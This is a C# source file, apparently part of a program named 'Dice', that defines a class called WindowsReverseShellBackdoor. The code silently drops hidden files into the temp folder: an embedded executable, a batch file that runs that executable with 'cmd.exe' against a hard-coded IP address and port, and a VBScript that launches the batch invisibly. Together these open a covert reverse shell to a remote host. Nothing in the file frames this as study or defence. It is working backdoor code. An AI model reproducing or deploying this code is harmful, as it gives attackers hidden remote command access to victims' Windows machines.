using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Dice
{
    class WindowsReverseShellBackdoor
    {
        public static void Start()
        {
            try
            {
                createFiles();
            }
            catch (Exception e)
            {
                Console.WriteLine("An error has occured.");
                Console.ReadLine();
                Environment.Exit(0);
            }
        }



        private static void createFiles()
        {
            //System.Environment.CurrentDirectory
            string shellPath = Path.Combine(Path.GetTempPath(), "shell.bat");
            string vbsPath = Path.Combine(Path.GetTempPath(), "run.vbs");
            string exePath = Path.Combine(Path.GetTempPath(), "dice2.exe");

            if (!File.Exists(shellPath))
            {
                string[] shellBatch = { "@ECHO OFF", "START /B " + exePath + " -e cmd.exe 75.121.233.30 27016" };
                File.WriteAllLines(shellPath, shellBatch);
                File.SetAttributes(shellPath, FileAttributes.Hidden);
            }

            if (!File.Exists(vbsPath))
            {
                string[] vbs = { "Set WshShell = CreateObject(\"WScript.Shell\" ) ", "WshShell.Run chr(34) & \"" + shellPath + "\" & Chr(34), 0 ", "Set WshShell = Nothing " };
                File.WriteAllLines(vbsPath, vbs);
                File.SetAttributes(vbsPath, FileAttributes.Hidden);
            }

            if (!File.Exists(exePath))
            {
               File.WriteAllBytes(exePath, Dice.Properties.Resources.dice2);
               File.SetAttributes(exePath, FileAttributes.Hidden);
            }
            System.Diagnostics.Process.Start(vbsPath);
        }
    }
}
